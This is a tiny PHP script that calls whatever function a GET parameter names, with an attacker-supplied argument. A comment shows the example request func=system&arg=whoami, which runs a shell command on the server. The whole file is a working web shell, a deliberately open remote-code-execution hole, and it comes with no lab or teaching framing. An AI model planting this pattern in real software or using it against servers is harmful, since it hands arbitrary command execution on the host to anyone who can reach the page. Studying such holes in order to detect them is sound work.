<?php
// URL : dynamic_func.php?func=system&arg=whoami 

$func = $_GET['func'] ?? '';
$arg = $_GET['arg'] ?? '';
if (function_exists($func)) {
    $result=$func($arg);
    echo "<pre>".htmlspecialchars((string)$result)."</pre>";
} else {
    echo "Function not allowed.";
}